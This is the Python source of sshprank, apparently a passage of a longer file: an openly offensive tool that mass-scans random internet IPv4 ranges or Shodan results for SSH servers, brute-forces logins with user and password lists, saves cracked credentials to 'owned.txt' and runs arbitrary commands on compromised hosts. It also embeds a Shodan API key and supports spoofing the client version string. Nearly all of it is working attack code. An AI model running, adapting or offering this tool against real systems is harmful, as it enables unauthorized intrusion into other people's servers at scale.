#!/usr/bin/python3
# -*- coding: utf-8 -*- ########################################################
#               ____                     _ __                                  #
#    ___  __ __/ / /__ ___ ______ ______(_) /___ __                            #
#   / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                            #
#  /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                             #
#                                           /___/ team                         #
#                                                                              #
# sshprank                                                                     #
# A fast SSH mass-scanner, login cracker, banner grabber and password auth     #
# checker tool using the python-masscan and shodan module.                     #
#                                                                              #
# NOTES                                                                        #
# quick'n'dirty code                                                           #
#                                                                              #
# AUTHOR                                                                       #
# noptrix                                                                      #
#                                                                              #
################################################################################


import errno
import getopt
import hashlib
import json
import os
import signal
import sys
import socket
import tempfile
import time
import random
import ipaddress
import threading
from concurrent.futures import ThreadPoolExecutor, wait, FIRST_COMPLETED
import warnings
import logging
import masscan
import paramiko
import paramiko.transport as _pt
import shodan


__author__ = 'noptrix'
__version__ = '1.7.0'
__copyright__ = 'Santa Claus'
__license__ = 'MIT'


SUCCESS = 0
FAILURE = 1

NORM = '\033[0;37;10m'
BOLD = '\033[1;37;10m'
RED = '\033[1;31;10m'
GREEN = '\033[1;32;10m'
YELLOW = '\033[1;33;10m'
BLUE = '\033[1;34;10m'

BANNER = BLUE + r'''              __                           __
   __________/ /_  ____  _________ _____  / /__
  / ___/ ___/ __ \/ __ \/ ___/ __ `/ __ \/ //_/
 (__  |__  ) / / / /_/ / /  / /_/ / / / / ,<
/____/____/_/ /_/ .___/_/   \__,_/_/ /_/_/|_|
               /_/
''' + NORM + '''
      --== [ by nullsecurity.net ] ==--'''

HELP = BOLD + '''usage''' + NORM + '''

  sshprank <mode> [opts] | <misc>

''' + BOLD + '''mode options''' + NORM + '''

  -h <hosts[:ports]>    - single host, cidr, ip range or host list file to
                          crack. multiple ports can be separated by comma,
                          e.g.: 127.0.0.1:22,222,2022 or 192.168.1.0/24:22
                          or 192.168.1.10-192.168.1.50:22 or 10.0.0.1-50
                          (default port: 22)

  -m <opts> [-r <num>]  - pass arbitrary masscan opts, portscan given hosts and
                          crack for logins. found sshd services will be saved to
                          'sshds.txt' in supported format for '-h' option and
                          even for '-b'. use '-r' for generating random ipv4
                          addresses rather than scanning given hosts. these
                          options are always on: '-sS -oX - --open'.
                          NOTE: if you intent to use the '--banner' option then
                          you need to specify '--source-ip <some_ipaddr>' which
                          is needed by masscan. better check masscan options!

  -s <str;page;lim>     - search ssh servers using shodan and crack logins.
                          see examples below. note: you need a better API key
                          than this one i offer in order to search more than 100
                          (= 1 page) ssh servers. so if you use this one use
                          '1' for 'page'.

  -b <hosts[:ports]>    - grab sshd banner from given target(s)
                          (default port: 22)
                          format: same as '-h' option

  -p <hosts[:ports]>    - check sshd(s) for password auth support
                          (default port: 22)
                          format: same as '-h' option

''' + BOLD + '''scan options''' + NORM + '''

  -r <num>              - generate <num> random ipv4 addresses, check for open
                          sshd port and crack for login (only with -m option!)

''' + BOLD + '''credential options''' + NORM + '''

  -U <user|file>        - single username or user list (default: root)
  -P <pass|file>        - single password or password list (default: root)
  -c <file>             - list of user:pass combination

''' + BOLD + '''brute options''' + NORM + '''

  -e                    - exclude host after first login was found. continue
                          with other hosts instead
  -E                    - exit sshprank completely after first login was found
  -z                    - shuffle target list randomly before cracking
                          (only with -h <file>). saves to 'random_targets.txt'
  -Z <num>              - random brute: pick random target + creds each attempt.
                          <num> total attempts, 0 = infinite (use with -h, -U/-P)

''' + BOLD + '''exec options''' + NORM + '''

  -C <cmd|file>         - read commands from file (line by line) or execute a
                          single command on host if login was cracked
  -N                    - do not output ssh command results

''' + BOLD + '''thread options''' + NORM + '''

  -x <num>              - num threads for parallel host crack (default: 50)
  -S <num>              - num threads for parallel service crack (default: 20)
  -X <num>              - num threads for parallel login crack (default: 5)
  -B <num>              - num threads for parallel banner grabbing (default: 70)

''' + BOLD + '''timeout options''' + NORM + '''

  -T <sec>              - num sec for auth and connect timeout (default: 5s)
  -R <sec>              - num sec for (banner) read timeout (default: 3s)

''' + BOLD + '''output options''' + NORM + '''

  -o <file>             - write found logins to file. format:
                          <host>:<port>:<user>:<pass> (default: owned.txt)
  -v                    - verbose mode. show found logins, sshds, etc.
                          (default: off)

''' + BOLD + '''misc options''' + NORM + '''

  -i <str>              - spoof ssh client version string sent to sshd
                          (default: paramiko's default version string)
  -w <file>             - session file: if it exists, restore progress from
                          it (skip already-tried creds). on ctrl+c / -E,
                          state is auto-saved to ./sshprank_session.json
                          (or to <file> if -w was given). pass it back via
                          -w to resume.
  -H                    - print help
  -V                    - print version information

''' + BOLD + '''examples''' + NORM + '''

  # crack targets from a given list with user admin, pw-list and 20 host-threads
  $ sshprank -h sshds.txt -U admin -P /tmp/passlist.txt -x 20

  # first scan then crack from founds ssh services using 'root:admin'
  $ sudo sshprank -m '-p22,2022 --rate 5000 --source-ip 192.168.13.37 \\
    --range 192.168.13.1/24' -P admin

  # generate 1k random ipv4 addresses, then port-scan (tcp/22 here) with 1k p/s
  # and crack logins using 'root:root' on found sshds
  $ sudo sshprank -m '-p22 --rate=1000' -r 1000 -v

  # search 50 ssh servers via shodan and crack logins using 'root:root' against
  # found sshds
  $ sshprank -s 'SSH;1;50'

  # grab banners and output to file with format supported for '-h' option
  $ sshprank -b hosts.txt > sshds2.txt

  # check if sshds support password auth
  $ sshprank -p sshds.txt -v

  # shuffle target list and crack
  $ sshprank -h sshds.txt -z -U root -P /tmp/passes.txt

  # random brute: 500 random attempts from ip/user/pass lists
  $ sshprank -h sshds.txt -U /tmp/users.txt -P /tmp/passes.txt -Z 500

  # random brute infinite (ctrl+c to stop)
  $ sshprank -h sshds.txt -U /tmp/users.txt -P /tmp/passes.txt -Z 0

  # spoof ssh client version and crack
  $ sshprank -h sshds.txt -i 'SSH-2.0-OpenSSH_8.9p1'

  # check pwauth with spoofed version
  $ sshprank -p sshds.txt -i 'SSH-2.0-OpenSSH_7.4' -v

  # session file: ctrl+c, then run again to resume
  $ sshprank -h sshds.txt -U /tmp/users.txt -P /tmp/passes.txt -w sess.json
'''

DEFAULT_SESSION_PATH = './sshprank_session.json'

stargets = []   # shodan
excluded = {}
excluded_hosts = set()
_log_lock = threading.Lock()
_exclude_lock = threading.Lock()
_progress_lock = threading.Lock()
_attempts_done = 0
_attempts_total = 0
_progress_running = False
_progress_unbounded = False
_submitted_lock = threading.Lock()
_submitted = {}   # {host: {port: count}} - cumulative iteration position
opts = {
  'targets': {},
  'targetlist': None,
  'masscan_opts': '--open ',
  'sho_opts': None,
  'sho_str': None,
  'sho_page': None,
  'sho_lim': None,
  'sho_key': 'Pp1oDSiavzKQJSsRgdzuxFJs8PQXzBL9',
  'user': 'root',
  'pass': 'root',
  'cmd': None,
  'cmd_no_out': False,
  'hthreads': 50,
  'sthreads': 20,
  'lthreads': 5,
  'bthreads': 70,
  'ctimeout': 5,
  'rtimeout': 3,
  'logfile': 'owned.txt',
  'exclude': False,
  'exit': False,
  'shuffle': False,
  'randbrute': None,
  'verbose': False,
  'sshver': None,
  'session': None,
  'userlist_path': None,
  'passlist_path': None,
  'combolist_path': None
}


def log(msg='', _type='normal', pre_esc='', esc='\n'):
  iprefix = f'{BOLD}{BLUE}[+] {NORM}'
  gprefix = f'{BOLD}{GREEN}[*] {NORM}'
  wprefix = f'{BOLD}{YELLOW}[!] {NORM}'
  eprefix = f'{BOLD}{RED}[-] {NORM}'
  clear = '\r\033[K' if _progress_running else ''

  if _type == 'normal':
    sys.stdout.write(f'{msg}')
  elif _type == 'verbose':
    sys.stdout.write(f'    > {msg}{esc}')
  elif _type == 'info':
    sys.stderr.write(f'{clear}{pre_esc}{iprefix}{msg}{esc}')
  elif _type == 'good':
    sys.stderr.write(f'{clear}{pre_esc}{gprefix}{msg}{esc}')
  elif _type == 'warn':
    sys.stderr.write(f'{clear}{pre_esc}{wprefix}{msg}{esc}')
  elif _type == 'error':
    sys.stderr.write(f'{clear}{pre_esc}{eprefix}{msg}{esc}')
    _cleanup_temp_files()
    os._exit(FAILURE)
  elif _type == 'spin':
    sys.stderr.flush()
    for i in ('-', '\\', '|', '/'):
      sys.stderr.write(f'{pre_esc}{BOLD}{BLUE}[{i}] {NORM}{msg}')
      time.sleep(0.05)

  return


def parse_target(target):
  if target.endswith(':'):
    target = target.rstrip(':')

  dtarget = {target.rstrip(): ['22']}

  if ':' in target:
    starget = target.split(':')
    if starget[1]:
      try:
        if ',' in starget[1]:
          ports = [p.rstrip() for p in starget[1].split(',')]
        else:
          ports = [starget[1].rstrip('\n')]
        ports = list(filter(None, ports))
        dtarget = {starget[0].rstrip(): ports}
      except ValueError as err:
        log(err.args[0].lower(), 'error')

  return dtarget


def read_file(_file):
  try:
    with open(_file, 'r', encoding='latin-1') as f:
      return [line.rstrip('\r\n') for line in f if line.strip()]
  except (FileNotFoundError, PermissionError, OSError):
    log(f'could not read from {_file}', 'error')


_MAX_EXPANSION = 1_000_000
_temp_files = []


def _cleanup_temp_files():
  for p in _temp_files:
    try:
      if os.path.exists(p):
        os.unlink(p)
    except OSError:
      pass

  return


def _write_temp_targets(prefix, hosts, port_part):
  suffix = f':{port_part}' if port_part else ''
  fd, path = tempfile.mkstemp(prefix=prefix, suffix='.txt', text=True)
  try:
    with os.fdopen(fd, 'w') as f:
      for ip in hosts:
        f.write(f'{ip}{suffix}\n')
  except OSError as err:
    log(f'could not write target expansion: {err.strerror}', 'error')
    return None
  _temp_files.append(path)

  return path


def _expand_cidr_to_file(arg):
  if ':' in arg:
    host_part, port_part = arg.split(':', 1)
  else:
    host_part, port_part = arg, ''
  if '/' not in host_part or '.' not in host_part:
    return None
  try:
    net = ipaddress.ip_network(host_part.strip(), strict=False)
  except ValueError:
    return None
  count = net.num_addresses if net.num_addresses == 1 else max(0, net.num_addresses - 2)
  if count > _MAX_EXPANSION:
    log(f'cidr {host_part} expands to {count} hosts (max {_MAX_EXPANSION})',
        'error')
    return None
  hosts = [net.network_address] if net.num_addresses == 1 else list(net.hosts())

  return _write_temp_targets('sshprank_cidr_', hosts, port_part)


def _expand_range_to_file(arg):
  if ':' in arg:
    host_part, port_part = arg.split(':', 1)
  else:
    host_part, port_part = arg, ''
  if '-' not in host_part or '.' not in host_part:
    return None
  start_str, _, end_str = host_part.strip().partition('-')
  try:
    start = ipaddress.IPv4Address(start_str)
  except (ipaddress.AddressValueError, ValueError):
    return None
  if '.' in end_str:
    try:
      end = ipaddress.IPv4Address(end_str)
    except (ipaddress.AddressValueError, ValueError):
      return None
  else:
    if not end_str.isdigit() or not 0 <= int(end_str) <= 255:
      return None
    base = '.'.join(start_str.split('.')[:3])
    try:
      end = ipaddress.IPv4Address(f'{base}.{end_str}')
    except (ipaddress.AddressValueError, ValueError):
      return None
  if int(end) < int(start):
    log(f'invalid range: {host_part} (end < start)', 'error')
    return None
  count = int(end) - int(start) + 1
  if count > _MAX_EXPANSION:
    log(f'range {host_part} expands to {count} hosts (max {_MAX_EXPANSION})',
        'error')
    return None
  hosts = [ipaddress.IPv4Address(i) for i in range(int(start), int(end) + 1)]

  return _write_temp_targets('sshprank_range_', hosts, port_part)


def parse_cmdline(cmdline):
  global opts

  try:
    _opts, _args = getopt.gnu_getopt(cmdline,
      'h:m:s:b:p:r:U:P:c:C:Nx:S:X:B:T:R:o:i:w:eEzZ:vVH')
    if _args:
      log(f'unknown args: {", ".join(_args)}', 'error')
    for o, a in _opts:
      if o == '-h':
        if os.path.isfile(a):
          opts['targetlist'] = a
        else:
          expanded = _expand_cidr_to_file(a) or _expand_range_to_file(a)
          if expanded:
            opts['targetlist'] = expanded
          else:
            opts['targets'] = parse_target(a)
      if o == '-m':
        opts['masscan_opts'] += a
      if o == '-s':
        opts['sho_opts'] = a
      if o == '-b':
        if os.path.isfile(a):
          opts['targetlist'] = a
        else:
          expanded = _expand_cidr_to_file(a) or _expand_range_to_file(a)
          if expanded:
            opts['targetlist'] = expanded
          else:
            opts['targets'] = parse_target(a)
      if o == '-p':
        if os.path.isfile(a):
          opts['targetlist'] = a
        else:
          expanded = _expand_cidr_to_file(a) or _expand_range_to_file(a)
          if expanded:
            opts['targetlist'] = expanded
          else:
            opts['targets'] = parse_target(a)
      if o == '-r':
        opts['random'] = int(a)
      if o == '-U':
        if os.path.isfile(a):
          opts['userlist'] = read_file(a)
          opts['userlist_path'] = a
        else:
          opts['user'] = a
      if o == '-P':
        if os.path.isfile(a):
          opts['passlist'] = read_file(a)
          opts['passlist_path'] = a
        else:
          opts['pass'] = a
      if o == '-c':
        raw = read_file(a) or []
        valid = []
        bad = []
        for line in raw:
          if ':' in line:
            valid.append(line)
          else:
            bad.append(line)
        opts['combolist'] = valid
        opts['combolist_path'] = a
        opts['_combo_bad_lines'] = bad
      if o == '-C':
        opts['cmd'] = a
      if o == '-N':
        opts['cmd_no_out'] = True
      if o == '-x':
        opts['hthreads'] = int(a)
      if o == '-S':
        opts['sthreads'] = int(a)
      if o == '-X':
        opts['lthreads'] = int(a)
      if o == '-B':
        opts['bthreads'] = int(a)
      if o == '-T':
        opts['ctimeout'] = int(a)
      if o == '-R':
        opts['rtimeout'] = int(a)
      if o == '-o':
        opts['logfile'] = a
      if o == '-i':
        opts['sshver'] = a
      if o == '-w':
        opts['session'] = a
      if o == '-e':
        opts['exclude'] = True
      if o == '-E':
        opts['exit'] = True
      if o == '-z':
        opts['shuffle'] = True
      if o == '-Z':
        opts['randbrute'] = int(a)
      if o == '-v':
        opts['verbose'] = True
      if o == '-V':
        log(f'sshprank v{__version__}', _type='info')
        sys.exit(SUCCESS)
      if o == '-H':
        log(HELP)
        sys.exit(SUCCESS)
    for k, flag in (('hthreads', '-x'), ('sthreads', '-S'),
                    ('lthreads', '-X'), ('bthreads', '-B')):
      if opts[k] < 1:
        log(f'{flag} must be >= 1 (got {opts[k]})', 'error')
    if 'random' in opts and opts['random'] < 1:
      log(f'-r must be >= 1 (got {opts["random"]})', 'error')
    if opts['randbrute'] is not None and opts['randbrute'] < 0:
      log(f'-Z must be >= 0 (got {opts["randbrute"]})', 'error')
    bad = opts.pop('_combo_bad_lines', [])
    if bad:
      if opts['verbose']:
        for line in bad:
          log(f'skipping malformed combo line: {line!r}', 'warn')
      else:
        log(f'skipped {len(bad)} malformed combo line(s)', 'warn')
  except (getopt.GetoptError, ValueError) as err:
    log(err.args[0].lower(), 'error')

  return


def check_argv(cmdline):
  modes = False
  needed = ['-h', '-m', '-s', '-b', '-p', '-H', '-V']

  if set(needed).isdisjoint(set(cmdline)):
    log('wrong usage dude, check help', 'error')

  if '-h' in cmdline:
    if '-m' in cmdline or '-s' in cmdline or \
        '-b' in cmdline or '-p' in cmdline:
      modes = True
  if '-m' in cmdline:
    if '-h' in cmdline or '-s' in cmdline or \
        '-b' in cmdline or '-p' in cmdline:
      modes = True
  if '-s' in cmdline:
    if '-h' in cmdline or '-m' in cmdline or \
        '-b' in cmdline or '-p' in cmdline:
      modes = True
  if '-b' in cmdline:
    if '-h' in cmdline or '-m' in cmdline or \
        '-s' in cmdline or '-p' in cmdline:
      modes = True
  if '-p' in cmdline:
    if '-h' in cmdline or '-m' in cmdline or \
        '-s' in cmdline or '-b' in cmdline:
      modes = True

  if modes:
    log('choose only one mode', 'error')

  opts['_session_eligible'] = not (
    '-b' in cmdline or '-p' in cmdline or '-Z' in cmdline)

  if '-w' in cmdline and not opts['_session_eligible']:
    log('-w (session) has no effect with -b/-p/-Z, ignoring', 'warn')
    opts['session'] = None

  if '-r' in cmdline and '-m' not in cmdline:
    log('-r requires -m', 'error')

  return


def check_argc(cmdline):
  if len(cmdline) == 0:
    log('use -H for help', 'error')

  return


def grab_banner(host, port):
  s = None
  try:
    s = socket.create_connection((host, int(port)), opts['ctimeout'])
    s.settimeout(opts['rtimeout'])
    banner = str(s.recv(1024).decode('utf-8', errors='replace')).strip()
    if not banner:
      banner = '<NO BANNER>'
    log(f'{host}:{port}:{banner}\n')
  except socket.timeout:
    if opts['verbose']:
      log(f'socket timeout: {host}:{port}', 'warn')
  except (OSError, ValueError):
    if opts['verbose']:
      log(f'could not connect: {host}:{port}', 'warn')
  finally:
    if s:
      s.close()

  return


class PortScanner(masscan.PortScanner):
  @property
  def scan_result(self):
    return self._scan_result


def portscan():
  try:
    m = PortScanner()
    m.scan(hosts='', ports='0', arguments=opts['masscan_opts'], sudo=True)
  except masscan.NetworkConnectionError as err:
    log('\n')
    log('no sshds found or network unreachable', 'error')
  except Exception as err:
    log('\n')
    log(f'unknown masscan error occured: {err}', 'error')

  return m


def grep_service(scan, service='ssh', prot='tcp'):
  targets = []

  scan_result = scan.scan_result or {}
  for h, hdata in scan_result.get('scan', {}).items():
    for p, pdata in hdata.get(prot, {}).items():
      if pdata.get('state') != 'open':
        continue
      services = pdata.get('services') or []
      if services:
        for s in services:
          banner = s.get('banner', '')
          name = s.get('name', '')
          target = f"{h}:{p}:{banner}\n"
          if opts['verbose']:
            log(f'found sshd: {target}', 'good', esc='')
          if service in name:
            targets.append(target)
      else:
        if opts['verbose']:
          log(f'found sshd: {h}:{p}:<no banner grab>', 'good', esc='\n')
        targets.append(f'{h}:{p}:<no banner grab>\n')

  return targets


def log_targets(targets, logfile):
  try:
    with _log_lock:
      with open(logfile, 'a') as f:
        f.writelines(targets)
  except (FileNotFoundError, PermissionError) as err:
    log(f'{err.args[1].lower()}: {logfile}', 'warn')

  return


def _hash_file(path):
  if not path or not os.path.isfile(path):
    return None
  h = hashlib.sha256()
  try:
    with open(path, 'rb') as f:
      for chunk in iter(lambda: f.read(65536), b''):
        h.update(chunk)
    return h.hexdigest()
  except OSError:
    return None

  return

def _save_session(path):
  if not path:
    return
  data = {
    'version': __version__,
    'saved_at': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
    'hashes': {
      'userlist': _hash_file(opts.get('userlist_path')),
      'passlist': _hash_file(opts.get('passlist_path')),
      'combolist': _hash_file(opts.get('combolist_path')),
    },
    'submitted': {
      h: dict(ports) for h, ports in _submitted.items()
    },
    'excluded_hosts': sorted(excluded_hosts),
    'excluded_ports': {h: sorted(ps) for h, ps in excluded.items() if ps},
  }
  try:
    tmp = path + '.tmp'
    with open(tmp, 'w', encoding='utf-8') as f:
      json.dump(data, f, indent=2)
    os.replace(tmp, path)
  except OSError as err:
    log(f'could not save session to {path}: {err}', 'warn')

  return


def _resolve_session_path(interrupted):
  if opts['session']:
    return opts['session']
  if interrupted and opts.get('_session_eligible', True):
    return DEFAULT_SESSION_PATH

  return None


def _save_and_log_session(interrupted):
  path = _resolve_session_path(interrupted)
  if path:
    _save_session(path)
    log(f'session saved to {path}', 'info')


def _load_session(path):
  if not path or not os.path.isfile(path):
    return None
  try:
    with open(path, 'r', encoding='utf-8') as f:
      return json.load(f)
  except (OSError, json.JSONDecodeError) as err:
    log(f'session file corrupt ({err}), starting fresh', 'warn')
    return None

  return


def _apply_session(data):
  global _submitted
  hashes = data.get('hashes', {})
  for kind, path_key in (('userlist', 'userlist_path'),
                          ('passlist', 'passlist_path'),
                          ('combolist', 'combolist_path')):
    saved = hashes.get(kind)
    if not saved:
      continue
    cur = _hash_file(opts.get(path_key))
    if cur and cur != saved:
      log(f'{kind} changed since last session - results may be off', 'warn')
  with _submitted_lock:
    for h, ports in data.get('submitted', {}).items():
      _submitted[h] = {p: int(c) for p, c in ports.items()}
  for h in data.get('excluded_hosts', []):
    excluded_hosts.add(h)
  for h, ps in data.get('excluded_ports', {}).items():
    excluded.setdefault(h, set()).update(ps)

  return


def _progress_inc_done(n=1):
  global _attempts_done
  with _progress_lock:
    _attempts_done += n

  return


def _progress_inc_total(n):
  global _attempts_total
  with _progress_lock:
    _attempts_total += n

  return


def _progress_loop():
  iprefix = f'{BOLD}{BLUE}[+] {NORM}'
  while _progress_running:
    with _progress_lock:
      done, total = _attempts_done, _attempts_total
    if _progress_unbounded:
      sys.stderr.write(f'\r{iprefix}cracking {done} attempts   ')
      sys.stderr.flush()
    elif total > 0:
      pct = done / total * 100
      sys.stderr.write(f'\r{iprefix}cracking {done}/{total} ({pct:.2f}%)   ')
      sys.stderr.flush()
    time.sleep(0.25)
  with _progress_lock:
    done, total = _attempts_done, _attempts_total
  if _progress_unbounded:
    sys.stderr.write(f'\r{iprefix}cracking {done} attempts\n')
    sys.stderr.flush()
  elif total > 0:
    pct = done / total * 100
    sys.stderr.write(f'\r{iprefix}cracking {done}/{total} ({pct:.2f}%)\n')
    sys.stderr.flush()

  return


def status(future, msg, pre_esc=''):
  while future.running():
    log(msg, 'spin', pre_esc)

  return


def _run_remote_cmd(cli, cmd):
  try:
    stdin, stdout, stderr = cli.exec_command(cmd, timeout=opts['ctimeout'])
    try:
      stdin.channel.shutdown_write()
    except Exception:
      pass
    if opts['cmd_no_out']:
      return
    rl = stdout.readlines()
    el = stderr.readlines()
  except Exception as err:
    if opts['verbose']:
      log(f"ssh command failed: '{cmd}' ({str(err)})", 'warn')
    return
  if rl:
    log(f"ssh command result for: '{cmd}'", 'good', pre_esc='\n')
    for out in rl:
      log(f'{out}')
  if el:
    log(f"ssh command stderr for: '{cmd}'", 'warn', pre_esc='\n')
    for err in el:
      log(f'{err}')

  return


def crack_login(host, port, username, password):
  global excluded, excluded_hosts

  cli = paramiko.SSHClient()
  cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())

  try:
    if host not in excluded_hosts and port not in excluded[host]:
      cli.connect(host, port, username, password, timeout=opts['ctimeout'],
        allow_agent=False, look_for_keys=False, auth_timeout=opts['ctimeout'])
      try:
        chan = cli.get_transport().open_session(timeout=opts['ctimeout'])
        chan.close()
      except Exception as err:
        if opts['verbose']:
          log(f'fake login: {host}:{port} (no channel: {str(err)})', 'warn')
        return
      if opts['exclude']:
        with _exclude_lock:
          if host in excluded_hosts:
            return
          excluded_hosts.add(host)
      login = f'{host}:{port}:{username}:{password}'
      log_targets(f'{login}\n', opts['logfile'])
      if opts['verbose']:
        log(f'found login: {login}', _type='good')
      else:
        log(f'found a login (check {opts["logfile"]})', _type='good')
      if opts['cmd']:
        if os.path.isfile(opts['cmd']):
          log(f"sending ssh commands from {opts['cmd']}", 'info')
          with open(opts['cmd'], 'r', encoding='latin-1') as _file:
            for cmd in _file:
              cmd = cmd.rstrip()
              if not cmd:
                continue
              _run_remote_cmd(cli, cmd)
        else:
          log('sending your single ssh command line', 'info')
          _run_remote_cmd(cli, opts['cmd'].rstrip())
      if opts['exit']:
        global _progress_running
        _progress_running = False
        _save_and_log_session(interrupted=True)
        log('game over', 'info')
        _cleanup_temp_files()
        os._exit(SUCCESS)
      return SUCCESS
  except paramiko.AuthenticationException as err:
    if 'publickey' in str(err):
      excluded[host].add(port)
    if opts['verbose']:
      if 'publickey' in str(err):
        reason = 'pubkey auth'
      elif 'Authentication failed' in str(err):
        reason = 'auth failed'
      elif 'Authentication timeout' in str(err):
        reason = 'auth timeout'
      else:
        reason = 'unknown'
      log(f'login failure: {host}:{port} ({reason})', 'warn')
  except (paramiko.ssh_exception.NoValidConnectionsError, socket.error):
    if opts['verbose']:
      log(f'could not connect: {host}:{port}', 'warn')
    excluded[host].add(port)
  except paramiko.SSHException as err:
    if opts['verbose']:
      log(f'ssh error: {host}:{port} ({str(err)})', 'warn')
  except Exception as err:
    if opts['verbose']:
      log(f'other error: {host}:{port} ({str(err)})', 'warn')
  finally:
    try:
      cli.close()
    except OSError:
      pass
    _progress_inc_done()

  return


def _creds_per_port():
  has_list = 'userlist' in opts or 'passlist' in opts or 'combolist' in opts
  c = 0 if has_list else 1

  if 'userlist' in opts and 'passlist' in opts:
    c += len(opts['userlist']) * len(opts['passlist'])
  elif 'userlist' in opts:
    c += len(opts['userlist'])
  elif 'passlist' in opts:
    c += len(opts['passlist'])
  if 'combolist' in opts:
    c += len(opts['combolist'])

  return c


def crack_port(host, port):
  with _submitted_lock:
    start_i = _submitted.get(host, {}).get(port, 0)
  if start_i > 0:
    _progress_inc_done(start_i)

  with ThreadPoolExecutor(opts['lthreads']) as exe:
    futures = set()
    max_pending = opts['lthreads'] * 4
    i = 0

    def submit(u, p):
      nonlocal futures, i
      i += 1
      if i <= start_i:
        return
      with _submitted_lock:
        _submitted.setdefault(host, {})[port] = i
      if len(futures) >= max_pending:
        _, futures = wait(futures, return_when=FIRST_COMPLETED)
      futures.add(exe.submit(crack_login, host, port, u, p))

    has_list = 'userlist' in opts or 'passlist' in opts or 'combolist' in opts
    if not has_list:
      submit(opts['user'], opts['pass'])

    if 'userlist' in opts and 'passlist' in opts:
      for u in opts['userlist']:
        for p in opts['passlist']:
          submit(u.rstrip(), p.rstrip())

    if 'userlist' in opts and 'passlist' not in opts:
      for u in opts['userlist']:
        submit(u.rstrip(), opts['pass'])

    if 'passlist' in opts and 'userlist' not in opts:
      for p in opts['passlist']:
        submit(opts['user'], p.rstrip())

    if 'combolist' in opts:
      for line in opts['combolist']:
        l = line.split(':', 1)
        submit(l[0].rstrip(), l[1].rstrip())

  return


def run_threads(host, ports):
  excluded.setdefault(host, set())

  with ThreadPoolExecutor(opts['sthreads']) as e:
    for port in ports:
      e.submit(crack_port, host, port)

  return


def gen_ipv4addr():
  try:
    ip = ipaddress.ip_address('.'.join(str(
      random.randint(0, 255)) for _ in range(4)))
    if not ip.is_loopback and not ip.is_private and not ip.is_multicast:
      return str(ip)
  except ValueError:
    pass

  return


def shuffle_targets():
  try:
    with open(opts['targetlist'], 'r', encoding='latin-1') as f:
      lines = f.readlines()
    random.shuffle(lines)
    shuffled = 'random_targets.txt'
    with open(shuffled, 'w', encoding='latin-1') as f:
      f.writelines(lines)
    opts['targetlist'] = shuffled
    log(f'shuffled {len(lines)} targets -> {shuffled}', 'info')
  except (FileNotFoundError, PermissionError) as err:
    log(f'{err.args[1].lower()}: {opts["targetlist"]}', 'error')

  return


def crack_rand_brute():
  try:
    with open(opts['targetlist'], 'r', encoding='latin-1') as f:
      hosts = [line.rstrip() for line in f if line.strip()]
  except (FileNotFoundError, PermissionError) as err:
    log(f'{err.args[1].lower()}: {opts["targetlist"]}', 'error')
    return

  users = opts.get('userlist', [opts['user']])
  passwords = opts.get('passlist', [opts['pass']])
  combos = opts.get('combolist', [])
  count = opts['randbrute']

  global _progress_unbounded
  if count > 0:
    _progress_inc_total(count)
  else:
    _progress_unbounded = True

  with ThreadPoolExecutor(opts['hthreads']) as exe:
    futures = set()
    max_pending = opts['hthreads'] * 4
    i = 0
    while count == 0 or i < count:
      target = random.choice(hosts)
      parsed = parse_target(target)
      host = list(parsed.keys())[0]
      port = random.choice(parsed[host])
      if combos:
        parts = random.choice(combos).split(':', 1)
        user = parts[0].rstrip()
        passwd = parts[1].rstrip()
      else:
        user = random.choice(users).rstrip()
        passwd = random.choice(passwords).rstrip()
      excluded.setdefault(host, set())
      if len(futures) >= max_pending:
        _, futures = wait(futures, return_when=FIRST_COMPLETED)
      futures.add(exe.submit(crack_login, host, port, user, passwd))
      i += 1

  return


def crack_single():
  host, ports = list(opts['targets'].copy().items())[0]
  if not host:
    log('empty host - check your -h argument', 'error')
  _progress_inc_total(len(ports) * _creds_per_port())
  run_threads(host, ports)

  return


def crack_multi():
  try:
    creds = _creds_per_port()
    with open(opts['targetlist'], 'r', encoding='latin-1') as f:
      with ThreadPoolExecutor(opts['hthreads']) as exe:
        futures = set()
        max_pending = opts['hthreads'] * 4
        for line in f:
          line = line.strip()
          if not line:
            continue
          if ':' in line:
            host, p = line.split(':', 1)
            host = host.strip()
            ports = [pp.rstrip() for pp in p.split(',')]
          else:
            host = line
            ports = ['22']
          if not host:
            continue
          _progress_inc_total(len(ports) * creds)
          if len(futures) >= max_pending:
            _, futures = wait(futures, return_when=FIRST_COMPLETED)
          futures.add(exe.submit(run_threads, host, ports))
  except (FileNotFoundError, PermissionError) as err:
    log(f"{err.args[1].lower()}: {opts['targetlist']}", 'error')

  return


def crack_random():
  ptargets = []

  for _ in range(opts['random']):
    ptargets.append(gen_ipv4addr())
  ptargets = [x for x in ptargets if x is not None]

  opts['masscan_opts'] += ' ' + ' '.join(ptargets)

  return


def crack_scan():
  with ThreadPoolExecutor(1) as e:
    future = e.submit(portscan)
    status(future, 'scanning sshds', pre_esc='\r')
  log('\n')
  targets = grep_service(future.result())
  num_targets = len(targets)

  if num_targets > 0:
    opts['targetlist'] = 'sshds.txt'
    log_targets(targets, opts['targetlist'])
    log(f'found {num_targets} active sshds', 'good')
    crack_multi()
  else:
    log('no sshds found :(', _type='warn')

  return


def check_banners():
  try:
    with open(opts['targetlist'], 'r', encoding='latin-1') as fh:
      with ThreadPoolExecutor(opts['bthreads']) as exe:
        futures = set()
        max_pending = opts['bthreads'] * 4
        for line in fh:
          line = line.strip()
          if not line:
            continue
          target = parse_target(line)
          host = ''.join([*target])
          if not host:
            continue
          ports = target.get(host)
          for port in ports:
            if len(futures) >= max_pending:
              _, futures = wait(futures, return_when=FIRST_COMPLETED)
            futures.add(exe.submit(grab_banner, host, port))
  except (FileNotFoundError, PermissionError) as err:
    log(f"{err.args[1].lower()}: {opts['targetlist']}", 'error')

  return


def check_pwauth(host, port):
  sock = None
  t = None
  try:
    sock = socket.create_connection(
      (host, int(port)), timeout=opts['ctimeout']
    )
    t = paramiko.Transport(sock)
    sec = t.get_security_options()
    try:
      sec.kex = list(_pt.Transport._preferred_kex)
      sec.ciphers = list(_pt._ENCRYPT.keys())
      sec.digests = list(_pt._MAC_INFO.keys())
    except Exception:
      pass
    t.start_client(timeout=opts['ctimeout'])
    t.auth_password('__sshprank_probe__', os.urandom(8).hex())
    log(f'{host}:{port}:pwauth=yes\n')
    if opts['verbose']:
      log(f'pwauth enabled: {host}:{port}', 'good')
  except paramiko.BadAuthenticationType as err:
    allowed = ','.join(err.allowed_types)
    log(f'{host}:{port}:pwauth=no ({allowed})\n')
